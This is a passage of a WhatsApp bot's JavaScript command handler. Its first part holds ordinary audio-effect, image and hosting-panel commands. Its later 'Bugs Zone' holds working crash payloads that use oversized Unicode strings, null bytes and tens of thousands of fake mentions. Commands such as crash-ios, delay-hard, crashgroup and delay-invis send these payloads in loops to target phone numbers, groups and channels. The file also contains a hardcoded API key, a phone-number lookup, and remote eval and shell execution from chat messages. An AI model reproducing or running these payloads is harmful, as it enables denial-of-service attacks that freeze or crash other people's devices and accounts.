        case 'blown':
 try {
let set
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/audio/.test(mime)) {
reply("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//            
        case 'deep':
 try {
let set
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/audio/.test(mime)) {
reply("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//            
        case 'earrape':
 try {
let set
if (/earrape/.test(command)) set = '-af volume=12'
if (/audio/.test(mime)) {
reply("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//            
        case 'fast':
 try {
let set
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/audio/.test(mime)) {
reply("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//            
        case 'fat':
 try {
let set
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/audio/.test(mime)) {
reply("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//            
        case 'nightcore':
 try {
let set
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/audio/.test(mime)) {
reply("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//            
        case 'robot':
 try {
let set
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/audio/.test(mime)) {
reply("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//            
        case 'slow':
 try {
let set
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/audio/.test(mime)) {
reply("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//            
        case 'smooth':
 try {
let set
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/audio/.test(mime)) {
reply("process.....")
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
bot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`reply audio with caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//==================================================//    
case 'chatgpt': {
    if (!text) return reply(`Example: ${prefix + command} what is a bot?`);
    const model_list = {
        chatgpt4: {
            api: 'https://stablediffusion.fr/gpt4/predict2',
            referer: 'https://stablediffusion.fr/chatgpt4'
        },
        chatgpt3: {
            api: 'https://stablediffusion.fr/gpt3/predict',
            referer: 'https://stablediffusion.fr/chatgpt3'
        }
    };

    try {
        let results = [];
        for (const [model, config] of Object.entries(model_list)) {
            try {
const axios = require('axios');
                const hmm = await axios.get(config.referer);
                const { data } = await axios.post(config.api, {
                    prompt: text
                }, {
                    headers: {
                        accept: '*/*',
                        'content-type': 'application/json',
                        origin: 'https://stablediffusion.fr',
                        referer: config.referer,
                        cookie: hmm.headers['set-cookie'].join('; '),
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'
                    }
                });
                results.push(`*${model.toUpperCase()}*:\n${data.message || 'invalid query.'}`);
            } catch (err) {
                results.push(`*${model.toUpperCase()}*:\nHere are the results.`);
                console.error(`Error on ${model}:`, err.message);
            }
        }
        m.reply(results.join('\n\n'));
    } catch (e) {
        console.error(e);
        m.reply('an error has occurred.');
    }
}
break
//==================================================//            
        case "revoke": 
 case "newlink": 
 case "reset": { 
   if (!m.isGroup) return reply(mess.group); // add "new Error" to create a new Error object 
   if (!isAdmins) return reply ("le bot doit d'abord être administrateur"); // add "new Error" to create a new Error object 
   if (!isBotAdmins) return reply(mess.admin); // add "new Error" to create a new Error object 
   await bot.groupRevokeInvite(m.chat); 
   await bot.sendText(m.chat, 'Lien de groupe révoqué !', m); // use "client.sendText" instead of "m.reply" to ensure message is sent 
   let response = await bot.groupInviteCode(m.chat); 
 bot.sendText(m.sender, `https://chat.whatsapp.com/${response}\n\nHere is the new group link for ${groupMetadata.subject}`, m, { detectLink: true }); 
 bot.sendText(m.chat, `Sent you the new group link in your inbox!`, m); 
   // use "client.sendTextWithMentions" instead of "client.sendText" to include group name in message 
 }          
  break;

//==================================================//    
        case 'arting': {
    if (!text) return reply('Provide text! Example: .arting girl wearing glasses');
    await bot.sendMessage(m.chat, { react: { text: '✨', key: m.key }});
    
    try {
        await bot.sendMessage(m.chat, { image: { url: `https://api.nekorinn.my.id/ai-img/arting?text=${text}` }}, { quoted: m });
    } catch (err) {
        console.log(err.message);
        bot.sendMessage(m.chat, { react: { text: '❌', key: m.key }});
        m.reply('failed to create image!');
    }
}
break;
//==================================================//          
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": 
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": 
case "unlimited": case "unli": {
  const func = require('./list/lib/utils.js') 
    if (!Owner) {
        return reply(mess.owner);
    }
    if (!text) return reply("username,225XXX");

    let nomor, usernem;
    let tek = text.split(",");
    if (tek.length > 1) {
        let [users, nom] = tek.map(t => t.trim());
        if (!users || !nom) return reply("username,225XXX");
        nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        usernem = users.toLowerCase();
    } else {
        usernem = text.toLowerCase();
        nomor = m.isGroup ? m.sender : m.chat
    }

    try {
        var onWa = await bot.onWhatsApp(nomor.split("@")[0]);
        if (onWa.length < 1) return reply("Number must be registered on WhatsApp!");
    } catch (err) {
        return reply("failed to get number on whatsapp: " + err.message);
    }

    // Mapping RAM, Disk, dan CPU
    const resourceMap = {
        "1gb": { ram: "1000", disk: "1000", cpu: "40" },
        "2gb": { ram: "2000", disk: "1000", cpu: "60" },
        "3gb": { ram: "3000", disk: "2000", cpu: "80" },
        "4gb": { ram: "4000", disk: "2000", cpu: "100" },
        "5gb": { ram: "5000", disk: "3000", cpu: "120" },
        "6gb": { ram: "6000", disk: "3000", cpu: "140" },
        "7gb": { ram: "7000", disk: "4000", cpu: "160" },
        "8gb": { ram: "8000", disk: "4000", cpu: "180" },
        "9gb": { ram: "9000", disk: "5000", cpu: "200" },
        "10gb": { ram: "10000", disk: "5000", cpu: "220" },
        "unlimited": { ram: "0", disk: "0", cpu: "0" }
    };
    
    let { ram, disk, cpu } = resourceMap[command] || { ram: "0", disk: "0", cpu: "0" };

    let username = usernem.toLowerCase();
    let email = username + "@gmail.com";
    let name = username + " Server";
    let password = username + "001";

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({ email, username, first_name: name, last_name: "Server", language: "en", password })
        });
        let data = await f.json();
        if (data.errors) return reply("Error: " + JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes;

        let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
            method: "GET",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey }
        });
        let data2 = await f1.json();
        let startup_cmd = data2.attributes.startup;
       
        let f2 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({
                name,
               
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:java_21",
                startup: startup_cmd,
                environment: { INST: "npm", USER_UPLOAD: "0", AUTO_UPDATE: "0", CMD_RUN: "npm start" },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] },
            })
        });
        let result = await f2.json();
        if (result.errors) return reply("Error: " + JSON.stringify(result.errors[0], null, 2));
        
        let server = result.attributes;
        var orang = nomor
        if (m.isGroup) {
        await reply(`Success ✅\ndata server is send to ${nomor == m.sender ? "private chat" : nomor.split("@")[0]}`)
        }        
        if (nomor !== m.sender && !m.isGroup) {
        await reply(`Success created panel ✅\ndata for panels are down here ${nomor.split("@")[0]}`)
        }
        
        let teks = `
*panel successfully created📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}


*🌐 Specification Server*
* Ram : *${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}*
* Disk : *${disk == "0" ? "Unlimited" : disk / 1000 + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu + "%"}*
* ${global.domain}

*Rules & Regulations:*
* panel expires in one week
* Don't share panel details 
* Gaurantee 15 days(1x replace)
* Claim uarantee once panel is down
`;

        await bot.sendMessage(orang, { text: teks }, { quoted: m });
    } catch (err) {
        return reply("an error occurred: " + err.message);
    }
}
break






//==================================================//       
    case "lookup": {
//inireact();
if (!q) return reply(`Example: ${m.prefix + m.command} 225XXXX`);
try {
var response = await fetch(`http://apilayer.net/api/validate?access_key=4a1ede76e87d9e64682b284e8620ad68&number=+${q}&country_code=&format=1`);
var result = await response.json();
reply(JSON.stringify(result, null, 2));
} catch (error) {
reply(`Error: ${error.message}`);
}
}
break    
                            
//==================================================//        
  case "getname": {
if (q) {
try {
var name = d4tbs.users[q].name
} catch {
var name = await bot.getName(q)
}
reply(name)
} else {
reply(m.pushName)
}
}
break      
//==================================================//
case 'addprem': {
if (!Owner) return reply(mess.owner)
if (args.length < 2)
return reply(`Use :\n*#addprem* @tag days\n*#addprem* number days\n\nContoh : #addprem @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
reply("Sukses Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
reply("Succès par le Number.")
await sleep(2000)
bot.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://i.postimg.cc/xTRMBxQ4/afgan.jpg`}, caption: `success added prem user`},{quoted: mdmodes })
}
}
break
        
        //Bugs Zone//      
        //Func Blank Group//
        async function PollingX(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `1@newsletter`,
                        newsletterName: "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(15000) + "ꦾ".repeat(90000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "\u0000".repeat(49999),
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: [ target, ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net` )],
                groupMentions: Array.from({ length: 49999 }, (_, i) => ({ groupJid: i === 0 ? '12036332@g.us' : '120999' + Math.floor(Math.random() * 1e10).toString().padStart(10, '0') + '@g.us', groupSubject: '\u0000' }))
            },
        };

        await bot.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("error :", err);
    }
}         
     
//==================================================//  
        //Func Delay invis Medium//
        async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg =  generateWAMessageFromContent(isTarget, message, {});

  await bot.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
//==================================================//  
        //Func Delay invis Medium//
  async function catalog(target, conn) {
for (let i = 0; i < 10; i++) {
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
videoMessage: {
url: "https://mmg.whatsapp.net/v/t62.7161-24/13804612_539276135886426_7177796676655806883_n.enc?ccb=11-4&oh=01_Q5Aa1QEfFbj640Qk2FD0ny7LyZd0M4_73VfKZVcxYuh5xwQzZA&oe=68216AB8&_nc_sid=5e03e0&mms3=true",
mimetype: "video/mp4",
fileSha256: "Q/adIgjaY3KiV8DkDQTo7521m0Zt2SYRbUAYr0WKIzU=",
fileLength: "999999999",
seconds: 9999,
mediaKey: "4nHO5QO3iSFHukSO+Rh9HRw0iadQ4gpggWmPCIAjVs4=",
caption: "愛? || ⏤͟𝗭𝗰𝗿𝗮𝘀𝗵͟͞͞",
height: 9999,
width: 9999,
fileEncSha256: "zeRhIzoqguVqfHibNdNW5ygXfYWEW8xWaFLzwkhIZ6w=",
directPath: "/v/t62.7161-24/13804612_539276135886426_7177796676655806883_n.enc?ccb=11-4&oh=01_Q5Aa1QEfFbj640Qk2FD0ny7LyZd0M4_73VfKZVcxYuh5xwQzZA&oe=68216AB8&_nc_sid=5e03e0",
mediaKeyTimestamp: "1744433512",
jpegThumbnail: null,
contextInfo: {
isSampled: true,
mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
length: 30000
}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
},
annotations: [{
embeddedContent: {
embeddedMusic: {
musicContentMediaId: "777",
songId: "777",
author: "Zcrash ||",
title: " Kagenou",
artistAttribution: "https://www.github.com/kagenouReal",
countryBlocklist: true,
isExplicit: true
}
},
embeddedAction: null
}]}}}}, {});
await bot.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]}]}]});
console.log("🧊 Success Send Stresszerv2 To Target")
}
}

    



       
        
          
  
//==================================================//      
    case 'crashch':
case 'crash-infinite': {
    if (!Owner) return reply("*You are not a Premium User*");
    if (!q) return reply("example: 120363xxxxxxx")

    if (!/^\d{15,}$/.test(q)) return reply("❌ Channel ID must be valid (120363xxxxxxx)");

    let target = `${q}@newsletter`;

    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`

𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${target}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`;
    reply(teks);
    ////////// Sending Bugs //////////
    for (let i = 0; i < 1; i++) {
    console.log(chalk.green(`© CrashApp : ${i}/1
target : ${target}`));
    await buttoncast(bot, target);
    await payoutzep(bot, target);
    await pendingpay(bot, target);
    }
    ////////// Succes Bugs //////////
}
break 
//==================================================//            
        case 'delay-hard': {
  try {
    if (!Owner) return reply(mess.premium);
    if (!q) return reply("example:225Xxx or tag @user")

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return reply("example: 225Xxx")
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
reply(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© delay : ${i}/1000
target : ${target}`));
await protocolbug7(bot, target)
await protocolbug7(bot, target)
await protocolbug7(bot, target)
await protocolbug7(bot, target)
await protocolbug7(bot, target)
await protocolbug7(bot, target)   
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    reply("Failed to send virus. Make sure the number is valid.");
}
}
break
//==================================================//                
case 'crash-ios': {
  try {
    if (!Owner) return reply(mess.premium);
    if (!q) return reply("example:628xxx or tag @user")

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return reply("Example: 225Xxx")
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
reply(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 50; i++) {
console.log(chalk.green(`© CrashIoS : ${i}/50
target : ${target}`));
await TrashLocIOS(bot, target)
await TrashLocIOS(bot, target)
await TrashLocIOS(bot, target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    reply("Failed to send virus. Make sure the number is valid.");
}
}
break
//==================================================//           
        case "delay-invis": {
if (!Owner) return reply('[ ! ] Only premium user can use this command')
if (!q) return reply(`Example: ${prefix + command} 225××`)
let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 250; i++) {
await bulldozer(target)
await bulldozer(target)
await catalog(target)
await catalog(target)
await bulldozer(target)
await bulldozer(target)
await catalog(target)
await bulldozer(target)
await bulldozer(target)
}
reply(`Suscesfully sending bug to ${target} ✅`)
}
break
//==================================================//      
        case "catalog": {
if (!Owner) return reply('[ ! ] Only premium user can use this command')
if (!q) return reply(`Example: ${prefix + command} 225××`)
let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 250; i++) {
await catalog(target)
await catalog(target)
await catalog(target)
await catalog(target)
await catalog(target)
await catalog(target)
await catalog(target)
await catalog(target)
await catalog(target)
}
reply(`Suscesfully sending bug to ${target} ✅`)
}
break
//==================================================//      
        case 'blank-group': {
    if (!Owner) return reply("This Feature Only Send By Bot Number");
if (!m?.isGroup) return reply(mess.group)
    bot.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
    //Paramater
    for (let r = 0; r < 15; r++) {
        

    await PollingX(m.chat);
    await PollingX(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
            reply(`[ ؆ ]𝐀𝐋𝐋 𝐌𝐄𝐌𝐁𝐄𝐑𝐒 𝐃𝐎𝐖𝐍
 _*\`Status\`*_ : *SUCCESS  ATTACK ✅*
 _*\`Type\`*_ : _${command}_
>  ⚠️ WARNING ⚠️


> 𝐏𝐚𝐮𝐬𝐞 𝐟𝐢𝐯𝐞 𝐦𝐢𝐧𝐮𝐭𝐞𝐬 𝐬𝐨 𝐭𝐡𝐚𝐭 𝐛𝐨𝐭 𝐢𝐬 𝐧𝐨𝐭 𝐛𝐚𝐧𝐧𝐞𝐝`)   
}
break; 
//==================================================//                
        case 'frezegrup':
case 'crashgroup': {
  if (!Owner) return reply(mess.owner);
  if (!q) return reply("example: https://chat.whatsapp.com/");

  try {
    await sleep(1000);
    reply(`Bot successfully sends a virus message`);

    let result = args[0].split("https://chat.whatsapp.com/")[1];
    let target = await bot.groupAcceptInvite(result);

////////// Sending Bugs //////////
for (let i = 0; i < 1; i++) {
console.log(chalk.green(`© FrezeGrup : ${i}/1
target : ${target}`));
await GroupFreze(bot, target);
await spack2(bot, target);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    reply("Failed to send virus. Make sure the number or link is valid.");
  }
}
break
//==================================================//                
        case "enhancer":
            case "unblur":
            case "enhance":
            case "hdr":
            case "hd":
            case "remini": {
                bot.enhancer = bot.enhancer ? bot.enhancer : {};
                if (m.sender in bot.enhancer) return reply(`\nprovide a query to be processed\n`)
                let q = m.quoted ? m.quoted : m;
                let mime = (q.msg || q).mimetype || q.mediaType || "";
                if (!mime) return reply(`\nimage reply, with the caption ${prefix + command}\n`)
                if (!/image\/(jpe?g|png)/.test(mime)) return reply(`mime ${mime} that is supported`)
                else bot.enhancer[m.sender] = true;
            
                let img = await q.download?.();
                let error;
                try {
                    const This = await remini(img, "enhance");
                                     bot.sendFile(m.chat, This, "", "```success...```", m);
                } catch (er) {
                    error = true;
                } finally {
                    if (error) {
                        reply(m.chat, "proses failed :(", m)
                    }
                    delete bot.enhancer[m.sender];
                }
            }
                break;
//==================================================//        
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161': {
let koi = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await bot.sendMessage(m.chat, { audio: koi, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
break
//==================================================//
default:
if (budy.startsWith('=>')) {
if (!Owner) return reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.length > 100000) {
if (sender == botNumber) return
if (!isGroup) return afgan.updateBlockStatus(m.sender, 'block')
}
//==================================================//
if (budy.startsWith("#")) {
if (!Owner) return reply(mess.owner)
try {
let evaled = await eval(q)
if (typeof evaled !== "string") evaled = util.inspect(evaled)
} catch (e) {
console.log(e)
}
}
//==================================================//
if (budy.startsWith('_')) {
if (!Owner) return reply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}
    } catch (err) {
